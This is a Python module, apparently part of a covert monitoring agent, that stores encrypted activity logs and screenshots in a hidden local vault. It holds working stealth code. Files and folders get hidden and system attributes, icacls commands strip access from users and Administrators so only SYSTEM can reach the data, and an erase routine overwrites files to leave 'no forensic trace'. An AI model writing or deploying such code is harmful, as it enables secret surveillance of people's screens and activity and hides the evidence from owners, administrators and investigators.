# vault_manager.py — creates and manages the encrypted local vault

import os, ctypes, sqlite3, struct, hashlib
from pathlib import Path
from datetime import datetime
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

SALT_FILE = ".salt"
DB_FILE   = "activity.db"


# ── KEY DERIVATION ────────────────────────────────────────────────────────────

def _load_or_create_salt(vault_dir: Path) -> bytes:
    salt_path = vault_dir / SALT_FILE
    if salt_path.exists():
        return salt_path.read_bytes()
    salt = secrets.token_bytes(32)
    salt_path.write_bytes(salt)
    _hide_file(salt_path)
    return salt

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=390000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())


# ── AES-256-CBC ENCRYPT / DECRYPT ────────────────────────────────────────────

def encrypt_bytes(data: bytes, key: bytes) -> bytes:
    iv = secrets.token_bytes(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    return iv + ct  # prepend IV

def decrypt_bytes(data: bytes, key: bytes) -> bytes:
    iv, ct = data[:16], data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ct) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# ── WINDOWS STEALTH ───────────────────────────────────────────────────────────

def _hide_file(path: Path):
    """Set HIDDEN + SYSTEM attributes on a file."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02 | 0x04)
    except Exception:
        pass

def _hide_folder(path: Path):
    """Set HIDDEN + SYSTEM attributes on a folder."""
    try:
        path.mkdir(parents=True, exist_ok=True)
        ctypes.windll.kernel32.SetFileAttributesW(str(path), 0x02 | 0x04)
    except Exception:
        pass

def _lock_folder_acl(path: Path):
    """
    Lock folder ACL so only SYSTEM account can access it.
    Regular admin access gets denied without the decryption key.
    Uses icacls via subprocess — works on all Windows versions.
    """
    import subprocess
    try:
        folder = str(path)
        # Remove all inherited permissions
        subprocess.run(["icacls", folder, "/inheritance:r"], capture_output=True)
        # Remove all existing permissions
        subprocess.run(["icacls", folder, "/remove", "Everyone"], capture_output=True)
        subprocess.run(["icacls", folder, "/remove", "Users"], capture_output=True)
        subprocess.run(["icacls", folder, "/remove", "Administrators"], capture_output=True)
        # Grant only SYSTEM full control
        subprocess.run(["icacls", folder, "/grant", "SYSTEM:(OI)(CI)F"], capture_output=True)
    except Exception:
        pass


# ── VAULT INIT ────────────────────────────────────────────────────────────────

def init_vault(vault_dir: Path, password: str) -> bytes:
    """
    Create vault folder, hide it, lock ACL, return derived AES key.
    Call once at agent startup.
    """
    _hide_folder(vault_dir)
    _lock_folder_acl(vault_dir)

    ss_dir = vault_dir / "ss"
    _hide_folder(ss_dir)

    salt = _load_or_create_salt(vault_dir)
    key  = derive_key(password, salt)

    # Init SQLite DB (plain — rows are encrypted individually)
    db_path = vault_dir / DB_FILE
    conn = sqlite3.connect(str(db_path))
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id        INTEGER PRIMARY KEY AUTOINCREMENT,
            ts        TEXT    NOT NULL,
            category  TEXT    NOT NULL,
            payload   BLOB    NOT NULL
        )
    """)
    conn.commit()
    conn.close()
    _hide_file(db_path)

    return key


# ── VAULT WRITE ───────────────────────────────────────────────────────────────

def vault_write(vault_dir: Path, key: bytes, category: str, plaintext: str):
    """Encrypt a log entry and write to DB."""
    db_path = vault_dir / DB_FILE
    ts      = datetime.utcnow().isoformat()
    blob    = encrypt_bytes(plaintext.encode("utf-8", errors="replace"), key)
    conn    = sqlite3.connect(str(db_path))
    conn.execute("INSERT INTO logs (ts, category, payload) VALUES (?, ?, ?)",
                 (ts, category, blob))
    conn.commit()
    conn.close()

def vault_write_screenshot(vault_dir: Path, key: bytes, png_bytes: bytes) -> str:
    """Encrypt a screenshot PNG and save to ss/ subfolder."""
    ss_dir = vault_dir / "ss"
    ts     = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fname  = ss_dir / f"{ts}.enc"
    blob   = encrypt_bytes(png_bytes, key)
    fname.write_bytes(blob)
    _hide_file(fname)
    return str(fname)


# ── VAULT READ (for controller later) ────────────────────────────────────────

def vault_read_all(vault_dir: Path, key: bytes) -> list:
    """Decrypt and return all log entries."""
    db_path = vault_dir / DB_FILE
    if not db_path.exists():
        return []
    conn = sqlite3.connect(str(db_path))
    rows = conn.execute("SELECT ts, category, payload FROM logs ORDER BY id").fetchall()
    conn.close()
    result = []
    for ts, category, blob in rows:
        try:
            text = decrypt_bytes(blob, key).decode("utf-8", errors="replace")
            result.append({"ts": ts, "category": category, "text": text})
        except Exception:
            result.append({"ts": ts, "category": category, "text": "[decrypt error]"})
    return result

def vault_read_screenshot(vault_dir: Path, key: bytes, enc_path: str) -> bytes:
    """Decrypt a screenshot file and return raw PNG bytes."""
    return decrypt_bytes(Path(enc_path).read_bytes(), key)


# ── VAULT ERASE ───────────────────────────────────────────────────────────────

def vault_erase(vault_dir: Path):
    """
    Securely wipe vault — overwrite all files with zeros before deleting.
    Leaves no forensic trace.
    """
    import shutil
    for f in vault_dir.rglob("*"):
        if f.is_file():
            try:
                size = f.stat().st_size
                with open(f, "wb") as fh:
                    fh.write(b"\x00" * size)
                f.unlink()
            except Exception:
                pass
    try:
        shutil.rmtree(str(vault_dir), ignore_errors=True)
    except Exception:
        pass
